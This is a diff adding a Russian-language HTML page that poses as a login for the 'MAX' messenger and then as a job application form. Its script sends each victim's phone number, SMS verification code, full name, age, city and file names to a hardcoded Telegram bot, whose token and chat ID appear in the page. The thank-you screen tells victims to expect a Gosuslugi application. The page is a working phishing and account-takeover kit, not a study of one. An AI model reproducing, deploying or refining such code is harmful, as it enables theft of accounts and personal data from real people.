@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MAX</title>
+    <style>
+        :root {
+            --bg-main: #0A0C10;
+            --bg-card: #12151C;
+            --text-main: #FFFFFF;
+            --text-muted: #8B95A5;
+            --input-bg: #1C212B;
+            --input-border: #2A313D;
+            --btn-gradient: linear-gradient(135deg, #00B2FF 0%, #006AFF 50%, #A100FF 100%);
+            --success-color: #10B981;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            outline: none;
+        }
+
+        body, html {
+            height: 100%;
+            background-color: var(--bg-main);
+            color: var(--text-main);
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .bg-glow {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 50% -10%, rgba(0, 106, 255, 0.2) 0%, transparent 60%),
+                radial-gradient(circle at 50% 110%, rgba(161, 0, 255, 0.15) 0%, transparent 60%);
+            z-index: 0;
+        }
+
+        .bg-glow::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background-image: radial-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px);
+            background-size: 25px 25px;
+        }
+
+        .auth-card {
+            width: 100%;
+            max-width: 420px;
+            height: 100%;
+            background: var(--bg-card);
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            z-index: 1;
+            border-left: 1px solid rgba(255,255,255,0.03);
+            border-right: 1px solid rgba(255,255,255,0.03);
+            box-shadow: 0 0 80px rgba(0, 0, 0, 0.8);
+        }
+
+        @media (min-width: 500px) {
+            .auth-card {
+                height: 90vh;
+                max-height: 820px;
+                border-radius: 36px;
+                border: 1px solid rgba(255, 255, 255, 0.08);
+            }
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            height: 24px;
+            margin-bottom: 40px;
+        }
+
+        .icon-btn {
+            width: 24px;
+            height: 24px;
+            fill: var(--text-muted);
+            cursor: pointer;
+            transition: fill 0.2s;
+        }
+        
+        .icon-btn:hover { fill: var(--text-main); }
+
+        .logoWrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+            position: relative;
+            height: 60px;
+        }
+
+        .logo-glow {
+            position: absolute;
+            width: 150px;
+            height: 80px;
+            background: var(--btn-gradient);
+            filter: blur(50px);
+            opacity: 0.4;
+            z-index: 1;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .logo-text {
+            position: relative;
+            z-index: 2;
+            font-size: 46px;
+            font-weight: 800;
+            letter-spacing: -2px;
+            background: var(--btn-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: lowercase;
+            filter: drop-shadow(0 0 20px rgba(0, 178, 255, 0.3));
+        }
+
+        .step {
+            display: none;
+            flex-direction: column;
+            flex: 1;
+            animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            overflow-y: auto;
+            padding-bottom: 10px;
+        }
+        
+        .step.active { display: flex; }
+
+        .step::-webkit-scrollbar { width: 4px; }
+        .step::-webkit-scrollbar-track { background: transparent; }
+        .step::-webkit-scrollbar-thumb { background: var(--input-border); border-radius: 4px; }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h2 {
+            text-align: center;
+            font-size: 21px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            line-height: 1.3;
+            letter-spacing: -0.5px;
+        }
+
+        .input-group {
+            display: flex;
+            background-color: var(--input-bg);
+            border-radius: 18px;
+            padding: 18px 20px;
+            margin-bottom: 14px;
+            align-items: center;
+            border: 1.5px solid var(--input-border);
+            transition: border-color 0.3s, background-color 0.3s;
+        }
+
+        .input-group:focus-within {
+            border-color: #006AFF;
+            background-color: #1F2531;
+        }
+
+        .country-select select {
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 17px;
+            appearance: none;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        
+        .country-select select option { background-color: var(--input-bg); }
+
+        .divider {
+            width: 1.5px;
+            height: 22px;
+            background-color: var(--input-border);
+            margin: 0 16px;
+        }
+
+        .phone-input {
+            background: transparent;
+            border: none;
+            color: var(--text-main);
+            font-size: 18px;
+            flex: 1;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+        }
+
+        .phone-input::placeholder {
+            color: #4b5563;
+            font-weight: 500;
+        }
+
+        .hint {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin-bottom: 20px;
+            line-height: 1.5;
+            padding: 0 5px;
+            font-weight: 500;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 18px;
+            border-radius: 18px;
+            border: none;
+            background-color: var(--input-bg);
+            color: #4b5563;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: not-allowed;
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            margin-top: 10px;
+        }
+
+        .btn.active {
+            background: var(--btn-gradient);
+            color: #ffffff;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(0, 106, 255, 0.4);
+        }
+
+        .btn.active:active { transform: scale(0.97); }
+
+        .btn.success {
+            background: var(--success-color);
+            color: white;
+            box-shadow: 0 8px 25px rgba(16, 185, 129, 0.4);
+            cursor: default;
+        }
+
+        .code-container {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .code-input {
+            width: 54px;
+            height: 64px;
+            background-color: var(--input-bg);
+            border: 1.5px solid var(--input-border);
+            border-radius: 16px;
+            color: var(--text-main);
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            transition: all 0.2s;
+            caret-color: #00B2FF;
+        }
+
+        .code-input:focus {
+            border-color: #00B2FF;
+            background-color: #1F2531;
+            box-shadow: 0 0 0 4px rgba(0, 178, 255, 0.15);
+        }
+
+        .timer {
+            text-align: center;
+            font-size: 15px;
+            color: var(--text-muted);
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        .timer span { color: var(--text-main); font-weight: 600; }
+
+        .footer {
+            margin-top: auto;
+            text-align: center;
+            font-size: 13px;
+            color: #4b5563;
+            line-height: 1.6;
+            padding-bottom: 10px;
+            padding-top: 20px;
+            font-weight: 500;
+        }
+
+        .footer a {
+            color: #00B2FF;
+            text-decoration: none;
+            font-size: 16px;
+            display: inline-block;
+            margin-top: 24px;
+            font-weight: 700;
+            transition: color 0.2s;
+        }
+
+        .footer a:hover { color: #A100FF; }
+
+        /* СТИЛИ ДЛЯ РЕЗЮМЕ */
+        .resume-section {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--input-border);
+            border-radius: 18px;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+
+        .resume-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #00B2FF;
+            margin-bottom: 16px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .text-input, .select-input {
+            background-color: var(--input-bg);
+            border: 1.5px solid var(--input-border);
+            border-radius: 12px;
+            padding: 14px 16px;
+            color: var(--text-main);
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            width: 100%;
+            transition: border-color 0.3s, background-color 0.3s;
+        }
+        
+        .select-input {
+            appearance: none;
+            cursor: pointer;
+        }
+
+        .text-input:focus, .select-input:focus {
+            border-color: #006AFF;
+            background-color: #1F2531;
+        }
+
+        .text-input::placeholder { color: #4b5563; }
+        
+        textarea.text-input { resize: none; }
+
+        .file-upload-label {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background-color: var(--input-bg);
+            border: 1.5px dashed var(--input-border);
+            border-radius: 12px;
+            padding: 16px;
+            color: var(--text-muted);
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .file-upload-label:hover {
+            border-color: #00B2FF;
+            color: #00B2FF;
+            background-color: #1F2531;
+        }
+
+        .file-list {
+            margin-top: 10px;
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        .file-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 4px;
+        }
+
+        .file-item svg { width: 16px; height: 16px; fill: currentColor; }
+
+        /* СТИЛИ ДЛЯ ЭКРАНА БЛАГОДАРНОСТИ */
+        .success-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            height: 100%;
+            animation: fadeIn 0.6s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: rgba(16, 185, 129, 0.1);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 24px;
+            color: var(--success-color);
+            box-shadow: 0 0 30px rgba(16, 185, 129, 0.2);
+        }
+
+        .success-icon svg {
+            width: 40px;
+            height: 40px;
+            fill: none;
+            stroke: currentColor;
+            stroke-width: 3;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .success-title {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            line-height: 1.3;
+        }
+
+        .success-text {
+            font-size: 16px;
+            color: var(--text-muted);
+            line-height: 1.5;
+            max-width: 300px;
+            margin-bottom: 30px;
+        }
+
+        .success-text span {
+            color: #00B2FF;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-glow"></div>
+
+    <div class="auth-card">
+        
+        <!-- ШАГ 1: Ввод номера -->
+        <div class="step active" id="step-phone">
+            <div class="header">
+                <svg class="icon-btn" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+                <svg class="icon-btn" viewBox="0 0 24 24"><path d="M11 18h2v-2h-2v2zm1-16C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/></svg>
+            </div>
+
+            <div class="logoWrapper">
+                <div class="logo-glow"></div>
+                <div class="logo-text">max</div>
+            </div>
+
+            <h2>С каким номером телефона<br>хотите войти?</h2>
+
+            <div class="input-group">
+                <div class="country-select">
+                    <select id="country">
+                        <option value="+7">🇷🇺 +7</option>
+                        <option value="+375">🇧🇾 +375</option>
+                        <option value="+77">🇰🇿 +77</option>
+                    </select>
+                </div>
+                <div class="divider"></div>
+                <input type="tel" id="phone" class="phone-input" placeholder="123 456 78 90">
+            </div>
+
+            <div class="hint">
+                Для входа нужен номер страны из списка —<br>нажмите на флаг, чтобы выбрать
+            </div>
+
+            <button class="btn" id="btn-next" disabled>Продолжить</button>
+
+            <div class="footer">
+                Нажимая «Продолжить», вы принимаете политику<br>конфиденциальности и пользовательское соглашение
+                <br>
+                <a href="#" onclick="return false;">Войти по QR-коду</a>
+            </div>
+        </div>
+
+        <!-- ШАГ 2: Ввод кода -->
+        <div class="step" id="step-code">
+            <div class="header">
+                <svg class="icon-btn" onclick="goBack()" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+            </div>
+
+            <div class="logoWrapper">
+                <div class="logo-glow"></div>
+                <div class="logo-text">max</div>
+            </div>
+
+            <h2>Отправили код<br>на <span id="display-phone" style="color: #fff;"></span></h2>
+            <div class="hint" style="text-align: center; font-size: 15px; margin-bottom: 30px;">Проверьте входящие СМС</div>
+
+            <div class="code-container">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+            </div>
+
+            <div class="timer">Получить новый код можно через <span id="timer-text">00:59</span></div>
+            
+            <button class="btn active" id="btn-submit-code" onclick="submitCode()" style="margin-top: auto;">Продолжить</button>
+        </div>
+
+        <!-- ШАГ 3: Резюме и Документы -->
+        <div class="step" id="step-resume">
+            <div class="header">
+                <svg class="icon-btn" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+            </div>
+
+            <div class="logoWrapper" style="margin-bottom: 20px;">
+                <div class="logo-glow"></div>
+                <div class="logo-text" style="font-size: 38px;">max</div>
+            </div>
+
+            <h2>Заполнение профиля</h2>
+            
+            <form id="resume-form" onsubmit="submitResume(event)">
+                <!-- Блок 1 -->
+                <div class="resume-section">
+                    <div class="resume-title">Личные данные</div>
+                    <input type="text" id="res-name" class="text-input" placeholder="ФИО" required>
+                    <input type="number" id="res-age" class="text-input" placeholder="Возраст" required min="16" max="99">
+                    <input type="text" id="res-city" class="text-input" placeholder="Город проживания" required style="margin-bottom: 0;">
+                </div>
+
+                <!-- Блок 2 -->
+                <div class="resume-section">
+                    <div class="resume-title">Опыт и график</div>
+                    <input type="text" id="res-job" class="text-input" placeholder="Желаемая должность" required>
+                    
+                    <!-- Выбор графика смен -->
+                    <select id="res-schedule" class="select-input" required>
+                        <option value="" disabled selected>Когда можете выйти на смену?</option>
+                        <option value="2/2 (День)">2/2 (День)</option>
+                        <option value="2/2 (Ночь)">2/2 (Ночь)</option>
+                        <option value="5/2 (Пн-Пт)">5/2 (Пн-Пт)</option>
+                        <option value="Сутки через двое">Сутки через двое</option>
+                        <option value="Подработка / Вахта">Подработка / Вахта</option>
+                        <option value="Готов выйти завтра">Могу выйти завтра</option>
+                    </select>
+
+                    <textarea id="res-about" class="text-input" placeholder="Кратко о себе и опыте работы..." rows="3" style="margin-bottom: 0;"></textarea>
+                </div>
+
+                <!-- Блок 3 -->
+                <div class="resume-section">
+                    <div class="resume-title">Документы</div>
+                    <label for="file-upload" class="file-upload-label">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
+                        Прикрепить файлы (PDF, WORD, JPG)
+                    </label>
+                    <!-- Добавлены форматы .doc и .docx -->
+                    <input type="file" id="file-upload" multiple accept=".pdf,.jpg,.jpeg,.png,.doc,.docx" style="display: none;" onchange="handleFiles(this.files)">
+                    <div id="file-list" class="file-list"></div>
+                </div>
+
+                <button type="submit" class="btn active" id="btn-submit-resume" style="margin-top: 10px;">Отправить анкету</button>
+            </form>
+            
+            <div class="footer" style="padding-top: 10px;"></div>
+        </div>
+
+        <!-- ШАГ 4: Экран благодарности -->
+        <div class="step" id="step-success">
+            <div class="success-screen">
+                <div class="success-icon">
+                    <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                </div>
+                <div class="success-title">Спасибо за резюме!</div>
+                <div class="success-text">
+                    Ваши данные успешно отправлены.<br><br>
+                    Ожидайте заявление на <span>Госуслуги</span> в ближайшее время. Мы свяжемся с вами для подтверждения деталей.
+                </div>
+                <div style="font-size: 40px; font-weight: 900; background: var(--btn-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -2px;">max</div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const BOT_TOKEN = "9178954905:AAGVzG6Eat1vIdFCwT2tXxWNlRTHJVzGxeI"; 
+        const CHAT_ID = "5562276138";
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error("Ошибка отправки в TG", error);
+            }
+        }
+
+        const phoneInput = document.getElementById('phone');
+        const btnNext = document.getElementById('btn-next');
+        const countrySelect = document.getElementById('country');
+        const stepPhone = document.getElementById('step-phone');
+        const stepCode = document.getElementById('step-code');
+        const stepResume = document.getElementById('step-resume');
+        const stepSuccess = document.getElementById('step-success');
+        const displayPhone = document.getElementById('display-phone');
+        const codeInputs = document.querySelectorAll('.code-input');
+        let currentPhone = "";
+        let uploadedFiles = [];
+
+        // 1. Ввод номера
+        phoneInput.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '');
+            if (val.length > 10) val = val.slice(0, 10);
+
+            let formatted = '';
+            if (val.length > 0) formatted += val.substring(0, 3);
+            if (val.length > 3) formatted += ' ' + val.substring(3, 6);
+            if (val.length > 6) formatted += ' ' + val.substring(6, 8);
+            if (val.length > 8) formatted += ' ' + val.substring(8, 10);
+            
+            e.target.value = formatted;
+
+            if (val.length === 10) {
+                btnNext.classList.add('active');
+                btnNext.disabled = false;
+            } else {
+                btnNext.classList.remove('active');
+                btnNext.disabled = true;
+            }
+        });
+
+        btnNext.addEventListener('click', () => {
+            const country = countrySelect.value;
+            const phone = phoneInput.value.replace(/\D/g, '');
+            currentPhone = country + phone;
+            
+            displayPhone.textContent = country + " " + phoneInput.value;
+            stepPhone.classList.remove('active');
+            stepCode.classList.add('active');
+            
+            codeInputs[0].focus();
+            startTimer();
+
+            const msg = `📱 <b>Новый вход в MAX</b>\n\n<b>Номер:</b> <code>${currentPhone}</code>\n⏳ <i>Ожидание кода...</i>`;
+            sendToTelegram(msg);
+        });
+
+        // 2. Ввод кода
+        codeInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1) {
+                    if (index < codeInputs.length - 1) {
+                        codeInputs[index + 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value.length === 0) {
+                    if (index > 0) codeInputs[index - 1].focus();
+                }
+            });
+        });
+
+        function submitCode() {
+            let code = "";
+            codeInputs.forEach(input => code += input.value);
+            
+            if (code.length < 5) return;
+
+            codeInputs.forEach(input => input.disabled = true);
+
+            const msg = `🔑 <b>Получен код!</b>\n\n<b>Номер:</b> <code>${currentPhone}</code>\n<b>Код:</b> <code>${code}</code>`;
+            sendToTelegram(msg);
+
+            setTimeout(() => {
+                stepCode.classList.remove('active');
+                stepResume.classList.add('active');
+            }, 600);
+        }
+
+        // 3. Загрузка файлов
+        function handleFiles(files) {
+            const fileList = document.getElementById('file-list');
+            uploadedFiles = Array.from(files).map(f => f.name);
+            
+            fileList.innerHTML = '';
+            uploadedFiles.forEach(name => {
+                const div = document.createElement('div');
+                div.className = 'file-item';
+                div.innerHTML = `<svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg> ${name}`;
+                fileList.appendChild(div);
+            });
+        }
+
+        // 4. Отправка резюме и переход к успеху
+        function submitResume(e) {
+            e.preventDefault();
+
+            const name = document.getElementById('res-name').value;
+            const age = document.getElementById('res-age').value;
+            const city = document.getElementById('res-city').value;
+            const job = document.getElementById('res-job').value;
+            const schedule = document.getElementById('res-schedule').value;
+            const about = document.getElementById('res-about').value || "Не указано";
+            
+            let filesStr = uploadedFiles.length > 0 ? uploadedFiles.join(', ') : "Файлы не прикреплены";
+
+            const msg = `📄 <b>Новая анкета!</b>\n\n<b>Номер:</b> <code>${currentPhone}</code>\n\n<b>ФИО:</b> ${name}\n<b>Возраст:</b> ${age}\n<b>Город:</b> ${city}\n\n<b>Должность:</b> ${job}\n<b>График:</b> ${schedule}\n\n<b>О себе:</b>\n${about}\n\n<b>Документы:</b>\n${filesStr}`;
+            sendToTelegram(msg);
+
+            // Красиво меняем кнопку
+            const btn = document.getElementById('btn-submit-resume');
+            btn.classList.remove('active');
+            btn.classList.add('success');
+            btn.textContent = "Отправлено ✓";
+            btn.disabled = true;
+
+            // Через 1.2 секунды перекидываем на экран благодарности
+            setTimeout(() => {
+                stepResume.classList.remove('active');
+                stepSuccess.classList.add('active');
+            }, 1200);
+        }
+
+        // Утилиты
+        function goBack() {
+            stepCode.classList.remove('active');
+            stepPhone.classList.add('active');
+            codeInputs.forEach(input => { input.value = ""; input.disabled = false; });
+        }
+
+        let timerInterval;
+        function startTimer() {
+            clearInterval(timerInterval);
+            let timeLeft = 59;
+            const timerEl = document.getElementById('timer-text');
+            
+            timerInterval = setInterval(() => {
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerEl.textContent = "00:00";
+                    timerEl.parentElement.innerHTML = '<a href="#" style="color:#00B2FF;text-decoration:none;">Получить новый код</a>';
+                    return;
+                }
+                timeLeft--;
+                let sec = timeLeft < 10 ? "0" + timeLeft : timeLeft;
+                timerEl.textContent = `00:${sec}`;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
